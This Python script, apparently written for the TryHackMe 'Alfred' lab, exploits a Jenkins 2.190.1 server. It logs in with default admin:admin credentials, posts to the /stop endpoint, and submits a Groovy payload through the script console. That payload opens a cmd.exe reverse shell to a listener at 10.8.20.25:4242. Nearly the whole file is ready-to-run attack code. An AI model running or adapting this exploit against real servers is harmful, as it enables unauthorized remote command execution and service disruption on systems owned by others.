#!/usr/bin/env python3
import requests
import sys
import argparse
from api4jenkins import Jenkins


def get_arguments():
    parser = argparse.ArgumentParser(description="Python script for getting reverse shell on Jenkins 2.190.1"
                                     ,usage='%(prog)s -t <target machine ip>'
                                     ,epilog="Example --> ./jenkins.py -t http://10.10.166.155:8080/")
    parser.add_argument("-t","--target_url"
                        ,dest="url"
                        ,help="Targer url."
                        ,metavar="target_url")
    options = parser.parse_args()
    if len(sys.argv)==1:
        parser.print_help(sys.stderr)
        sys.exit(1)
    return options

class Exploit:
    def __init__(self, url):
        self.reponse = None
        self.url = url

    def alfred_exploit(self):
            session = requests.Session()
            session.auth = ("admin","admin")
            crumb_json = (session.get(f"{self.url}crumbIssuer/api/json", verify=False)).json()
            jenkins_abort = session.post(f"{self.url}stop", headers={'Jenkins-Crumb': f"{crumb_json['crumb']}"},json=crumb_json, verify=False)
            r = session.get(f"{self.url}script")
            print("Connected Successfully")
            request_header={
                    "Content-Type": "application/x-www-form-urlencoded"
            }
            script = """Thread.start {

            String host="10.8.20.25";

            int port=4242;

            String cmd="cmd.exe";

            Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

            }"""
            payload = {"script":script,"Jenkins-Crumb":f"{crumb_json['crumb']}","json":f"{crumb_json}","Submit":"Run"}
            r=session.post(f"{self.url}script",data=payload)
            print("Getting shell...........................")
            print("Check your netcat it's there")

    def version(self):
            j=Jenkins(f'{self.url}', auth=('admin', 'admin'))
            print(j.version)

if __name__ == "__main__":
    options = get_arguments()

    url_ip = options.url
    exploit = Exploit(url_ip)
    exploit.alfred_exploit()
    exploit.version()
